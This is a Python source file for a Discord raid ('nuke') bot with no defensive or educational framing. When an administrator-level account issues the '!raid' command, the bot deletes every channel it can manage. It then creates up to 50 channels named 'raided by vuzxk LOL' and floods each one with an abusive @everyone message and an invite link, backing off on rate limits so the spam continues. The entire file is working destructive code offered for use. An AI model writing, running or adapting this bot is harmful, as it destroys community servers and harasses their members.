import discord
from discord.ext import commands
import asyncio
import os

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN environment variable is required")

PREFIX = "!"
CHANNEL_NAME = "raided by vuzxk LOL"
DELETE_DELAY = 0.1
SPAM_DELAY = 0.3

SPAM_MESSAGE = "@everyone Fuck this lame ass server They GOT NUKED BY US LOLLL https://discord.gg/7xCHVchqTs"

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

active_spam_tasks = []

@bot.event
async def on_ready():
    pass

async def infinite_spam(channel):
    while True:
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
        except discord.Forbidden:
            break
        except discord.HTTPException as e:
            if e.status == 429:
                retry = float(e.response.headers.get("Retry-After", 3))
                await asyncio.sleep(retry + 1)
            else:
                await asyncio.sleep(2)
        except Exception:
            await asyncio.sleep(2)

async def delete_channel_safe(channel):
    try:
        await channel.delete()
        await asyncio.sleep(DELETE_DELAY)
        return True
    except Exception:
        return False

@bot.command(name="raid")
@commands.has_permissions(administrator=True)
async def raid(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    channels_to_delete = list(guild.channels)
    delete_tasks = [
        asyncio.create_task(delete_channel_safe(ch))
        for ch in channels_to_delete
        if ch.permissions_for(guild.me).manage_channels
    ]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    await asyncio.sleep(1.0)

    created_count = 0
    max_creates = 50

    for _ in range(max_creates):
        try:
            new_channel = await guild.create_text_channel(name=CHANNEL_NAME)
            created_count += 1

            spam_task = asyncio.create_task(infinite_spam(new_channel))
            active_spam_tasks.append(spam_task)

        except discord.Forbidden:
            break
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.response.headers.get("Retry-After", 5))
                await asyncio.sleep(retry_after + 2)
            else:
                await asyncio.sleep(0.1)
        except Exception:
            await asyncio.sleep(0.1)

    await asyncio.sleep(999999)

@bot.event
async def on_command_error(ctx, error):
    pass

if __name__ == "__main__":
    bot.run(TOKEN)
